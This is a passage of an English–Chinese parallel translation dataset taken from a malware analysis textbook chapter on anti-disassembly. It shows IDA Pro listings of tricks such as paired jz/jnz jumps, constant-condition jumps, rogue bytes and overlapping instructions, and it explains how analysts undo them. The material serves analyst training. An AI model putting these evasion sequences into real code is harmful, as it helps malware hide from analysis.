    use the call instruction to get a pointer to a fixed piece of data instead of
    actually calling a subroutine. In this example, the call instruction is used to
    create a pointer for the string hello on the stack. The pop instruction following
    the call then takes this value off the top of the stack and puts it into a register
    (EAX in this case).
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: call指令是反汇编器必须做出决定的另一个地方。被调用的位置被添加到未来的反汇编列表中，以及call指令后的位置。就像条件跳转指令一样，大多数反汇编器将首先反汇编call指令后的字节，然后是调用位置。在手工汇编中，程序员通常会使用call指令来获取指向固定数据块的指针，而不是实际调用子程序。在这个例子中，call指令用于在堆栈上创建字符串hello的指针。随后的pop指令然后从这个值中取出并将其放入寄存器（在这个例子中是EAX）。
- en: 'When we disassemble this binary with IDA Pro, we see that it has produced disassembly
    that is not what we expected:'
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们使用IDA Pro反汇编这个二进制文件时，我们看到它产生了我们预期的反汇编结果：
- en: E8 06 00 00 00 call near ptr loc_4011CA+1
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: E8 06 00 00 00 call near ptr loc_4011CA+1
- en: 68 65 6C 6C 6F
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: 68 65 6C 6C 6F
- en: push 6F6C6C65h
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: push 6F6C6C65h
- en: 'loc_4011CA:'
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011CA:'
- en: 00 58 C3 add [eax-3Dh], bl
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: 00 58 C3 add [eax-3Dh], bl
- en: As it turns out, the first letter of the string hello is the letter *h*, which
    is 0x68 in hexadecimal. This is also the opcode of the 5-byte instruction  push
    DWORD. The null terminator for the hello string turned out to also be the first
    Anti-Disassembly
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 结果表明，字符串hello的第一个字母是字母*h*，十六进制表示为0x68。这同时也是5字节指令 push DWORD的指令码。hello字符串的空终止符也恰好是第一个Anti-Disassembly
- en: '**333**'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '**333**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: byte of another legitimate instruction. The flow-oriented disassembler in IDA
    Pro decided to process the thread of disassembly at  (immediately following the
    call instruction) before processing the target of the call instruction, and thus
    produced these two erroneous instructions. Had it processed the target first,
    it still would have produced the first push instruction, but the instruction following
    the push would have conflicted with the real instructions it disassembled as a
    result of the call target.
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 字节被另一个合法指令的字节覆盖。IDA Pro中的面向流程的反汇编器决定在（紧跟在call指令之后）处理反汇编线程，然后再处理call指令的目标，因此产生了这两个错误的指令。如果它首先处理目标，它仍然会产生第一个push指令，但随后的指令将与由于call目标而反汇编的实际指令冲突。
- en: 'If IDA Pro produces inaccurate results, you can manually switch bytes from
    data to instructions or instructions to data by using the C or D keys on the keyboard,
    as follows:'
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: 如果IDA Pro产生不准确的结果，你可以通过使用键盘上的C或D键手动将字节从数据转换为指令或从指令转换为数据，如下所示：
- en: 
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Pressing the C key turns the cursor location into code.
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: 按下C键将光标位置转换为代码。
- en: 
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: 
- en: Pressing the D key turns the cursor location into data.
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: 按下D键将光标位置转换为数据。
- en: 'Here is the same function after manual cleanup:'
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: 下面是经过手动清理后的相同函数：
- en: E8 06 00 00 00 call loc_4011CB
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: E8 06 00 00 00 call loc_4011CB
- en: 68 65 6C 6C 6F 00 aHello db 'hello',0
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: 68 65 6C 6C 6F 00 aHello db 'hello',0
- en: 'loc_4011CB:'
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011CB:'
- en: 58 pop eax
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: 58 pop eax
- en: C3 retn
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: C3 retn
- en: '**Anti-Disassembly Techniques**'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: '**反汇编技术**'
- en: The primary way that malware can force a disassembler to produce inaccurate
    disassembly is by taking advantage of the disassembler’s choices and assumptions.
    The techniques we will examine in this chapter exploit the most basic assumptions
    of the disassembler and are typically easily fixed by a malware analyst. More
    advanced techniques involve taking advantage of information that the disassembler
    typically doesn’t have access to, as well as generating code that is impossible
    to disassemble completely with conventional assembly listings.
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件迫使反汇编器产生不准确反汇编的主要方式是利用反汇编器的选择和假设。在本章中我们将要检查的技术利用了反汇编器最基本的假设，通常很容易被恶意软件分析师修复。更高级的技术涉及利用反汇编器通常无法访问的信息，以及生成用传统汇编列表无法完全反汇编的代码。
- en: '***Jump Instructions with the Same Target***'
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: '***具有相同目标的跳转指令***'
- en: The most common anti-disassembly technique seen in the wild is two back-to-back
    conditional jump instructions that both point to the same target. For example,
    if a jz loc_512 is followed by jnz loc_512, the location loc_512 will always be
    jumped to. The combination of jz with jnz is, in effect, an unconditional jmp,
    but the disassembler doesn’t recognize it as such because it only disassembles
    one instruction at a time. When the disassembler encounters the jnz, it continues
    disassembling the false branch of this instruction, despite the fact that it will
    never be executed in practice.
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 在野外最常见的反汇编技术是两个连续的条件跳转指令，它们都指向同一个目标。例如，如果jz loc_512后面跟着jnz loc_512，那么loc_512位置总是会跳转。实际上，jz与jnz的组合相当于一个无条件jmp，但反汇编器并不将其识别为这样的指令，因为它一次只反汇编一条指令。当反汇编器遇到jnz时，它会继续反汇编这个指令的假分支，尽管在实际中这个分支永远不会被执行。
- en: '**334**'
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: '**334**'
- en: Chapter 15
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'The following code shows IDA Pro’s first interpretation of a piece of code
    protected with this technique:'
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 下面的代码显示了使用此技术保护的代码片段的IDA Pro的第一种解释：
- en: 74 03 jz short near ptr loc_4011C4+1
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: 74 03 jz short near ptr loc_4011C4+1
- en: 75 01 jnz short near ptr loc_4011C4+1
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 75 01 jnz short near ptr loc_4011C4+1
- en: 'loc_4011C4: ; CODE XREF: sub_4011C0'
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011C4: ; CODE XREF: sub_4011C0'
- en: ; sub_4011C0+2j
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: ; sub_4011C0+2j
- en: E8 58 C3 90 90 call near ptr 90D0D521h
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: E8 58 C3 90 90 call near ptr 90D0D521h
- en: In this example, the instruction immediately following the two conditional jump
    instructions appears to be a call instruction at , beginning with the byte 0xE8\.
    This is not the case, however, as both conditional jump instructions actually
    point 1 byte beyond the 0xE8 byte. When this fragment is viewed with IDA Pro,
    the code cross-references shown at  loc_4011C4 will appear in red, rather than
    the standard blue, because the actual references point inside the instruction
    at this location, instead of the beginning of the instruction. As a malware analyst,
    this is your first indication that anti-disassembly may be employed in the sample
    you are analyzing.
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个例子中，紧随两个条件跳转指令之后的指令看起来像是在位置处的调用指令，以字节0xE8开始。然而，实际情况并非如此，因为这两个条件跳转指令实际上都指向了0xE8字节之后的1个字节。当使用IDA
    Pro查看这个片段时，位置 loc_4011C4显示的代码交叉引用将以红色显示，而不是标准的蓝色，因为实际的引用指向了这个位置处的指令内部，而不是指令的开始处。作为一名恶意软件分析师，这是你分析样本时第一个表明可能使用了反汇编技术的迹象。
- en: The following is disassembly of the same code, but this time fixed with the
    D key, to turn the byte immediately following the jnz instruction into data, and
    the C key to turn the bytes at loc_4011C5 into instructions.
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: 下面的代码是同一代码的汇编，但这次使用D键进行了修正，将jnz指令之后的字节转换为数据，并使用C键将loc_4011C5处的字节转换为指令。
- en: 74 03 jz short near ptr loc_4011C5
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 74 03 jz short near ptr loc_4011C5
- en: 75 01 jnz short near ptr loc_4011C5
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: 75 01 jnz short near ptr loc_4011C5
- en: ; -------------------------------------------------------------------
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: ; -------------------------------------------------------------------
- en: E8 db 0E8h
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: E8 db 0E8h
- en: ; -------------------------------------------------------------------
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: ; -------------------------------------------------------------------
- en: 'loc_4011C5: ; CODE XREF: sub_4011C0'
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011C5: ; CODE XREF: sub_4011C0'
- en: ; sub_4011C0+2j
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: ; sub_4011C0+2j
- en: 58 pop eax
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: 58 pop eax
- en: C3 retn
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: C3 retn
- en: The column on the left in these examples shows the bytes that constitute the
    instruction. Display of this field is optional, but it’s important when learning
    anti-disassembly. To display these bytes (or turn them off), select **Options****General**.
    The Number of Opcode Bytes option allows you to enter a number for how many bytes
    you would like to be displayed.
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: 在这些示例中，左侧的列显示了构成指令的字节。显示此字段是可选的，但在学习反汇编时很重要。要显示这些字节（或关闭它们），请选择**选项****常规**。操作码字节数量选项允许您输入要显示的字节数。
- en: Figure 15-2 shows the sequence of bytes in this example graphically.
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: 图15-2以图形方式显示了此示例中的字节序列。
- en: JZ
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: JZ
- en: JNZ
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: JNZ
- en: POP RET
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: POP RET
- en: 74 03 75 01 E8
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: 74 03 75 01 E8
- en: '58'
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: '58'
- en: C3
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: C3
- en: CALL
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: CALL
- en: '*Figure 15-2: A jz instruction followed by a jnz instruction* Anti-Disassembly'
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: '*图15-2：jz指令后跟jnz指令的反汇编* '
- en: '**335**'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: '**335**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***A Jump Instruction with a Constant Condition***'
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: '***具有常量条件的跳转指令***'
- en: 'Another anti-disassembly technique commonly found in the wild is composed of
    a single conditional jump instruction placed where the condition will always be
    the same. The following code uses this technique: 33 C0 xor eax, eax'
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 另一种常见的反汇编技术是在条件始终相同的位置放置一个单独的条件跳转指令。以下代码使用此技术：33 C0 xor eax, eax
- en: 74 01 jz short near ptr loc_4011C4+1
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 74 01 jz short near ptr loc_4011C4+1
- en: 'loc_4011C4: ; CODE XREF: 004011C2j'
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011C4: ; CODE XREF: 004011C2j'
- en: '; DATA XREF: .rdata:004020ACo'
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: '; DATA XREF: .rdata:004020ACo'
- en: E9 58 C3 68 94 jmp near ptr 94A8D521h
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: E9 58 C3 68 94 jmp near ptr 94A8D521h
- en: Notice that this code begins with the instruction xor eax, eax. This instruction
    will set the EAX register to zero and, as a byproduct, set the zero flag. The
    next instruction is a conditional jump that will jump if the zero flag is set.
    In reality, this is not conditional at all, since we can guarantee that the zero
    flag will always be set at this point in the program.
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 注意，此代码以xor eax, eax指令开始。此指令将EAX寄存器设置为0，并作为副作用设置零标志。接下来的指令是一个条件跳转，如果零标志被设置，则会跳转。实际上，这根本不是条件性的，因为我们可以保证在程序的此点零标志始终会被设置。
- en: 'As discussed previously, the disassembler will process the false branch first,
    which will produce conflicting code with the true branch, and since it processed
    the false branch first, it trusts that branch more. As you’ve learned, you can
    use the D key on the keyboard while your cursor is on a line of code to turn the
    code into data, and pressing the C key will turn the data into code. Using these
    two keyboard shortcuts, a malware analyst could fix this fragment and have it
    show the real path of execution, as follows: 33 C0 xor eax, eax'
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，反汇编器将首先处理假分支，这将产生与真分支冲突的代码，并且由于它首先处理了假分支，因此它更信任这个分支。正如你所学的，当你将光标放在一行代码上时，可以按键盘上的D键将代码转换为数据，按C键将数据转换为代码。使用这两个键盘快捷键，恶意软件分析员可以修复这个片段，并显示实际的执行路径，如下所示：33
    C0 xor eax, eax
- en: 74 01 jz short near ptr loc_4011C5
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 74 01 jz short near ptr loc_4011C5
- en: ; --------------------------------------------------------------------
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: ; --------------------------------------------------------------------
- en: E9 db 0E9h
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: E9 db 0E9h
- en: ; --------------------------------------------------------------------
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: ; --------------------------------------------------------------------
- en: 'loc_4011C5: ; CODE XREF: 004011C2j'
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011C5: ; CODE XREF: 004011C2j'
- en: '; DATA XREF: .rdata:004020ACo'
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: '; DATA XREF: .rdata:004020ACo'
- en: 58 pop eax
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: 58 pop eax
- en: C3 retn
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: C3 retn
- en: In this example, the 0xE9 byte is used exactly as the 0xE8 byte in the previous
    example. E9 is the opcode for a 5-byte jmp instruction, and E8 is the opcode for
    a 5-byte call instruction. In each case, by tricking the disassembler into disassembling
    this location, the 4 bytes following this opcode are effectively hidden from view.
    Figure 15-3 shows this example graphically.
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 在此示例中，0xE9字节与上一个示例中的0xE8字节使用方式相同。E9是5字节jmp指令的操作码，E8是5字节call指令的操作码。在每种情况下，通过欺骗反汇编器将此位置反汇编，此操作码后的4个字节实际上被隐藏起来。图15-3以图形方式显示了此示例。
- en: XOR
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: XOR
- en: JZ
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: JZ
- en: POP
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: POP
- en: RET
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: RET
- en: '33'
  id: totrans-364
  prefs: []
  type: TYPE_NORMAL
  zh: '33'
- en: C0
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: C0
- en: '74'
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: '74'
- en: '01'
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: '01'
- en: E9
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: E9
- en: '58'
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: '58'
- en: C3
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: C3
- en: JMP
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: JMP
- en: '*Figure 15-3: False conditional of xor followed by a jz instruction* **336**'
  id: totrans-372
  prefs: []
  type: TYPE_NORMAL
  zh: '*图15-3：xor指令后跟jz指令的假条件**336**'
- en: Chapter 15
  id: totrans-373
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-374
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***Impossible Disassembly***'
  id: totrans-375
  prefs: []
  type: TYPE_NORMAL
  zh: '***不可能的反汇编***'
- en: In the previous sections, we examined code that was improperly disassembled
    by the first attempt made by the disassembler, but with an interactive disassembler
    like IDA Pro, we were able to work with the disassembly and have it produce accurate
    results. However, under some conditions, no traditional assembly listing will
    accurately represent the instructions that are executed. We use the term *impossible
    disassembly* for such conditions, but the term isn’t strictly accurate. You could
    disassemble these techniques, but you would need a vastly different representation
    of code than what is currently provided by disassemblers.
  id: totrans-376
  prefs: []
  type: TYPE_NORMAL
  zh: 在前面的章节中，我们检查了反汇编器第一次尝试反汇编的代码，但是使用像 IDA Pro 这样的交互式反汇编器，我们能够与反汇编一起工作，并产生准确的结果。然而，在某些条件下，没有任何传统的汇编列表能够准确地表示执行的指令。我们使用
    *不可能的反汇编* 这个术语来描述这种情况，但这个术语并不完全准确。你可以反汇编这些技术，但你将需要一个与当前反汇编器提供的代码完全不同的表示。
- en: The simple anti-disassembly techniques we have discussed use a data byte placed
    strategically after a conditional jump instruction, with the idea that disassembly
    starting at this byte will prevent the real instruction that follows from being
    disassembled because the byte that is inserted is the opcode for a multibyte instruction.
    We’ll call this a *rogue byte* because it is not part of the program and is only
    in the code to throw off the disassembler. In all of these examples, the rogue
    byte can be ignored.
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
  zh: 我们讨论的简单的反汇编技术使用一个数据字节，它被放置在条件跳转指令之后，其想法是，从这个字节开始的反汇编将阻止后续真实指令的反汇编，因为插入的字节是多字节指令的
    opcodes。我们将称之为 *违规字节*，因为它不是程序的一部分，而只是在代码中用来迷惑反汇编器的。在所有这些例子中，违规字节都可以被忽略。
- en: But what if the rogue byte can’t be ignored? What if it is part of a legitimate
    instruction that is actually executed at runtime? Here, we encounter a tricky
    scenario where any given byte may be a part of multiple instructions that are
    executed. No disassembler currently on the market will represent a single byte
    as being part of two instructions, yet the processor has no such limitation.
  id: totrans-378
  prefs: []
  type: TYPE_NORMAL
  zh: 但如果这个违规的字节不能被忽略怎么办？如果它是运行时实际执行的有效指令的一部分呢？在这里，我们遇到了一个棘手的场景，即任何给定的字节可能是多个执行指令的一部分。目前市场上没有任何反汇编器会将单个字节表示为两个指令的一部分，然而处理器并没有这样的限制。
- en: Figure 15-4 shows an example. The first instruction in this 4-byte sequence
    is a 2-byte jmp instruction. The target of the jump is the second byte of itself.
  id: totrans-379
  prefs: []
  type: TYPE_NORMAL
  zh: 图 15-4 展示了一个例子。这个 4 字节序列中的第一条指令是一个 2 字节 jmp 指令。跳转的目标是它自己的第二个字节。
- en: This doesn’t cause an error, because the byte FF is the first byte of the next
    2-byte instruction, inc eax.
  id: totrans-380
  prefs: []
  type: TYPE_NORMAL
  zh: 这不会引起错误，因为 FF 字节是下一个 2 字节指令 inc eax 的第一个字节。
- en: JMP −1
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
  zh: JMP -1
- en: EB
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
  zh: EB
- en: FF
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
  zh: FF
- en: C0
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
  zh: C0
- en: '48'
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
  zh: '48'
- en: INC EAX DEC EAX
  id: totrans-386
  prefs: []
  type: TYPE_NORMAL
  zh: INC EAX DEC EAX
- en: '*Figure 15-4: Inward-pointing jmp instruction*'
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 15-4：指向内部的 jmp 指令*'
- en: The predicament when trying to represent this sequence in disassembly is that
    if we choose to represent the FF byte as part of the jmp instruction, then it
    won’t be available to be shown as the beginning of the inc eax instruction. The
    FF byte is a part of both instructions that actually execute, and our modern disassemblers
    have no way of representing this. This 4-byte sequence increments EAX, and then
    decrements it, which is effectively a complicated NOP sequence. It could be inserted
    at almost any location within a program to break the chain of valid disassembly.
    To solve this problem, a malware analyst could choose to replace this entire sequence
    with NOP instructions using an IDC or IDAPython script that calls the PatchByte
    function. Another alternative is to simply turn it all into data with the D key,
    so that disassembly will resume as expected at the end of the 4 bytes.
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
  zh: 在尝试将这个序列表示为反汇编时遇到的困境是，如果我们选择将 FF 字节表示为 jmp 指令的一部分，那么它将无法作为 inc eax 指令的开始来显示。FF
    字节实际上是两个执行指令的一部分，而我们的现代反汇编器没有方法来表示这一点。这个 4 字节序列先增加 EAX，然后减少它，这实际上是一个复杂的 NOP 序列。它几乎可以插入到程序中的任何位置来打断有效的反汇编链。为了解决这个问题，恶意软件分析师可以选择使用
    IDC 或 IDAPython 脚本来调用 PatchByte 函数，用 NOP 指令替换这个整个序列。另一个选择是简单地使用 D 键将其全部转换为数据，这样反汇编将在
    4 字节结束时按预期继续。
- en: Anti-Disassembly
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
  zh: 反汇编
- en: '**337**'
  id: totrans-390
  prefs: []
  type: TYPE_NORMAL
  zh: '**337**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-391
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: For a glimpse of the complexity that can be achieved with these sorts of instruction
    sequences, let’s examine a more advanced specimen. Figure 15-5
  id: totrans-392
  prefs: []
  type: TYPE_NORMAL
  zh: 为了一瞥这些指令序列所能达到的复杂性，让我们考察一个更高级的样本。图15-5
- en: shows an example that operates on the same principle as the prior one, where
    some bytes are part of multiple instructions.
  id: totrans-393
  prefs: []
  type: TYPE_NORMAL
  zh: 展示了一个与前面一个相同的原理的例子，其中一些字节是多个指令的一部分。
- en: MOV ax, 05EBh
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
  zh: MOV ax, 05EBh
- en: XOR eax, eax
  id: totrans-395
  prefs: []
  type: TYPE_NORMAL
  zh: XOR eax, eax
- en: JZ - 7
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
  zh: JZ - 7
- en: Fake CALL
  id: totrans-397
  prefs: []
  type: TYPE_NORMAL
  zh: 假设CALL
- en: '66'
  id: totrans-398
  prefs: []
  type: TYPE_NORMAL
  zh: '66'
- en: B8
  id: totrans-399
  prefs: []
  type: TYPE_NORMAL
  zh: B8
- en: EB
  id: totrans-400
  prefs: []
  type: TYPE_NORMAL
  zh: EB
- en: '05'
  id: totrans-401
  prefs: []
  type: TYPE_NORMAL
  zh: '05'
- en: '31'
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
  zh: '31'
- en: C0
  id: totrans-403
  prefs: []
  type: TYPE_NORMAL
  zh: C0
- en: '74'
  id: totrans-404
  prefs: []
  type: TYPE_NORMAL
  zh: '74'
- en: F9
  id: totrans-405
  prefs: []
  type: TYPE_NORMAL
  zh: F9
- en: E8
  id: totrans-406
  prefs: []
  type: TYPE_NORMAL
  zh: E8
- en: JMP 5
  id: totrans-407
  prefs: []
  type: TYPE_NORMAL
  zh: JMP 5
- en: Real Code
  id: totrans-408
  prefs: []
  type: TYPE_NORMAL
  zh: 实际代码
- en: '*Figure 15-5: Multilevel inward-jumping sequence*'
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
  zh: '*图15-5：多级内向跳转序列*'
- en: The first instruction in this sequence is a 4-byte mov instruction. The last
    2 bytes have been highlighted because they are both part of this instruction and
    are also their own instruction to be executed later. The first instruction populates
    the AX register with data. The second instruction, an xor, will zero out this
    register and set the zero flag. The third instruction is a conditional jump that
    will jump if the zero flag is set, but it is actually unconditional, since the
    previous instruction will always set the zero flag. The disassembler will decide
    to disassemble the instruction immediately following the jz instruction, which
    will begin with the byte 0xE8, the opcode for a 5-byte call instruction. The instruction
    beginning with the byte E8 will never execute in reality.
  id: totrans-410
  prefs: []
  type: TYPE_NORMAL
  zh: 这个序列中的第一条指令是一个4字节的mov指令。最后两个字节被突出显示，因为它们都是这个指令的一部分，也是稍后要执行的指令。第一条指令将数据填充到AX寄存器中。第二条指令，一个xor，将清空这个寄存器并设置零标志。第三条指令是一个条件跳转，如果零标志被设置，则会跳转，但实际上是无条件的，因为前面的指令总是会设置零标志。反汇编器将决定立即反汇编jz指令之后的指令，该指令以字节0xE8开始，是5字节call指令的操作码。以字节E8开始的指令实际上永远不会执行。
- en: The disassembler in this scenario can’t disassemble the target of the jz instruction
    because these bytes are already being accurately represented as part of the mov
    instruction. The code that the jz points to will always be executed, since the
    zero flag will always be set at this point. The jz instruction points to the middle
    of the first 4-byte mov instruction. The last 2 bytes of this instruction are
    the operand that will be moved into the register. When disassembled or executed
    on their own, they form a jmp instruction that will jump forward 5 bytes from
    the end of the instruction.
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，反汇编器无法反汇编jz指令的目标，因为这些字节已经被准确地表示为mov指令的一部分。jz指向的代码总是会执行，因为在这个点上零标志总是会设置。jz指令指向第一条4字节mov指令的中间。这条指令的最后两个字节是将被移动到寄存器中的操作数。当单独反汇编或执行时，它们形成一个jmp指令，将从指令末尾向前跳过5个字节。
- en: 'When first viewed in IDA Pro, this sequence will look like the following: 66
    B8 EB 05 mov ax, 5EBh'
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
  zh: 当首次在IDA Pro中查看此序列时，它将如下所示：66 B8 EB 05 mov ax, 5EBh
- en: 31 C0 xor eax, eax
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
  zh: 31 C0 xor eax, eax
- en: 74 F9 jz short near ptr sub_4011C0+1
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
  zh: 74 F9 jz short near ptr sub_4011C0+1
- en: 'loc_4011C8:'
  id: totrans-415
  prefs: []
  type: TYPE_NORMAL
  zh: 'loc_4011C8:'
- en: E8 58 C3 90 90 call near ptr 98A8D525h
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
  zh: E8 58 C3 90 90 call near ptr 98A8D525h
- en: Since there is no way to clean up the code so that all executing instructions
    are represented, we must choose the instructions to leave in. The net side effect
    of this anti-disassembly sequence is that the EAX register is set to zero. If
    you manipulate the code with the D and C keys in IDA Pro so that the only instructions
    visible are the xor instruction and the hidden instructions, your result should
    look like the following.
  id: totrans-417
  prefs: []
  type: TYPE_NORMAL
  zh: 由于无法清理代码以便所有执行指令都得到表示，我们必须选择要留下的指令。这种反反汇编序列的净副作用是将EAX寄存器设置为0。如果你使用IDA Pro中的D和C键操作代码，使得唯一可见的指令是xor指令和隐藏的指令，你的结果应该如下所示。
- en: '**338**'
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
  zh: '**338**'
- en: Chapter 15
  id: totrans-419
  prefs: []
  type: TYPE_NORMAL
  zh: 第15章
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-420
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 66 byte_4011C0 db 66h B8 db 0B8h
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
  zh: 66 byte_4011C0 db 66h B8 db 0B8h
- en: EB db 0EBh
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
  zh: EB db 0EBh
- en: 05 db 5
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
  zh: 05 db 5
- en: ; ------------------------------------------------------------
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
  zh: ; ------------------------------------------------------------
- en: 31 C0 xor eax, eax
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
  zh: 31 C0 xor eax, eax
- en: ; ------------------------------------------------------------
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
  zh: ; ------------------------------------------------------------
- en: 74 db 74h
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
  zh: 74 db 74h
- en: F9 db 0F9h
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
  zh: F9 db 0F9h
- en: E8 db 0E8h
  id: totrans-429
